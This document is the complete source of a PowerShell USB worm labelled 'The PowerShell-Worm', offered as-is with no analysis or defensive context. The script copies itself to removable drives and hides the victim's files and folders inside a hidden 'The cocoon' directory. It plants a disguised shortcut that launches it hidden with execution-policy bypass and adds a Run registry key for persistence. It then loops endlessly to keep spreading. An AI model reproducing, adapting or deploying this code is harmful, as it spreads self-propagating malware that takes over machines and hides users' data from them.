#=============================================================
#==================       The PowerShell-Worm   ==============
#========= Development of script programming : Mr3 ===========
#=============================================================
 
#var

#Get name of current script
$ScriptName = $MyInvocation.MyCommand.Name
$fullPathIncFileName = $MyInvocation.MyCommand.Definition
#=============================================================
# object com
$WshShell = New-Object -comObject WScript.Shell
$Sh = New-Object -comObject Shell.Application
$Fs = New-Object -comObject Scripting.FileSystemObject

#=============================================================
# Function Spread -shortcut-usb
function Spread-usb {
$Fhs = New-Object -comObject Scripting.FileSystemObject
foreach ($driv in $Fhs.drives ){
    if ($driv.isready -eq  $true  ){
        if ($driv.drivetype -eq 1  ){
           if(!($Fhs.fileexists($driv.path + "\The cocoon"))){
             $Fhs.CreateFolder($driv.path + "\The cocoon" ).Attributes = 2+4
            }
           $drv= $driv.path + "\The cocoon\" + $ScriptName
           Copy-Item $fullPathIncFileName -destination $drv
           
           if (test-path $drv)
            {
             $Fhs.getfile($drv).attributes=2+4
             
            }
             # create a new shortcut
                   $ShellLink = $WshShell.CreateShortcut($driv.path + "\" + $driv.name + ".lnk")
                    $ShellLink.TargetPath       = 'cmd.exe'
                    $ShellLink.WindowStyle      = 7
                     
                    $ShellLink.workingdirectory = ""     
                    $ShellLink.arguments         = "/c start powershell.exe -noexit -NonInteractive -ExecutionPolicy Bypass -windowstyle hidden -File " + '"' + $drv + '"'                
                    $ShellLink.IconLocation     = $env:windir + "\system32\shell32.dll,7"
                    
                     
                    #Save the link
                    $ShellLink.Save()
            
            foreach ($file in $Fhs.getfolder($driv.path + "\" ).Files ){
                     
                     $fi = $file.name
                     $ff =$fi.split(".")
                     if ($fi.contains(".") )
                     {
                      if ($ff[1] -ne "lnk")
                         {
                            $file.attributes = 2+4
                            if ($fi -ne $ScriptName )
                            {
                            $Fhs.MoveFile($driv.path + "\" + $file.name,$driv.path + "\The cocoon\" + $file.name )
                            #Copy-Item -Path $file -destination $driv.path + "\The cocoon\"
                           
                            }
                         }
                     }
                     
               }
               foreach ($folder in $Fhs.getfolder($driv.path + "\" ).subfolders ){
                            
                           if ($folder.name -ne "The cocoon" )
                                        {
                                       $Fhs.MoveFolder($driv.path + "\" + $folder.name,$driv.path + "\The cocoon\" + $folder.name )
                                        }
             
                    
                }  
           
    }
 
  }

 }
}
#============================================================= 
# Function Kills CURRENT instance if this script already running. 
Function CURRENT-instance {
    
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory=$true)]
            [ValidateNotNullorEmpty()]
            [String]$ScriptName
        )
        
        $PsScriptsRunning = get-wmiobject win32_process | where{$_.processname -eq 'powershell.exe'} | select-object commandline,ProcessId

        ForEach ($PsCmdLine in $PsScriptsRunning){
            [Int32]$OtherPID = $PsCmdLine.ProcessId
            [String]$OtherCmdLine = $PsCmdLine.commandline
            #Are other instances of this script already running?
            If (($OtherCmdLine -match $ScriptName) -And ($OtherPID -ne $PID) ){
          
                Exit
            }
        }
 }



#============================ Main Script =================================
Function Main {
 $tmp = $env:temp + "\cocoon.ps1"   
 $player = " powershell -noexit -NonInteractive -ExecutionPolicy Bypass -windowstyle hidden -File " + '"' + $tmp + '"' 

 Start-Sleep -s 3    
CURRENT-instance -ScriptName $ScriptName   
$WshShell.regwrite("HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" + "The cocoon","cmd.exe /c " + $player, "REG_SZ")
$tr = $true;
while($tr) {
 
  if($fullPathIncFileName -ne $tmp){
 Copy-Item $fullPathIncFileName -destination $tmp
 
 cmd /c $player
  get-process powershell | stop-process
Start-Sleep -s 3

 Exit
 
  }
    #folder-self-Path    
   Spread-usb
    Start-Sleep -s 5
 
}}
Main